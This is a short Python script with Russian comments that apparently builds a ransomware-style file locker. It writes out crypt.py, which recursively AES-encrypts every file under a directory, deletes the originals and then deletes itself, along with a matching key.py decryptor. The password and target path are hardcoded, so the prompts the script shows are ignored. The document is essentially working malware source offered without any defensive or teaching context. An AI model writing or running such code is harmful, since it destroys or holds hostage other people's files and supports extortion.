# -*- coding: utf-8 -*-

direct = input("Write the root directory: ")  # Корневая директория с которой начнется зашифровка файлов
password = input("Write the password: ")  # Пароль которым будет происходить зашифровка
print("--------------------------------------------------")

with open("crypt.py", "w") as crypt:
    crypt.write('''
# -*- coding: utf-8 -*-

import os   
import sys


def crypt(file):
    import pyAesCrypt
    print("--------------------------------------------------")
    password = "helloworld"
    buffer_size = 512 * 1024
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)
    print("[crypted] '" + str(file) + ".crp'")
    os.remove(file)


def walk(dir):  # Шифрует файлы по директориям
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        if os.path.isfile(path): 
            crypt(path)
        else:
            walk(path)


walk("/root/PycharmProjects/Encryptor/Test")    # Корневая директория с которой начинается шифровка
print("--------------------------------------------------")
os.remove(str(sys.argv[0]))
''')

    print("[+] File 'crypt.py' successfully saved!")

with open("key.py", "w") as key:
    key.write('''
# -*- coding: utf-8 -*-
import os


def decrypt(file):
    import pyAesCrypt
    print("--------------------------------------------------")
    password = "helloworld"
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, buffer_size)
    print("[decrypted] '" + str(os.path.splitext(file)[0]) + "'")
    os.remove(file)


def walk(dir_):
    for name in os.listdir(dir_):
        path = os.path.join(dir_, name)

        if os.path.isfile(path):
            try:
                decrypt(path)
            except:
                pass
        else:
            walk(path)


walk("/root/PycharmProjects/Encryptor/Test")
print("--------------------------------------------------")          
''')
    print("[+] File 'key.py' successfully saved!")

print("--------------------------------------------------")
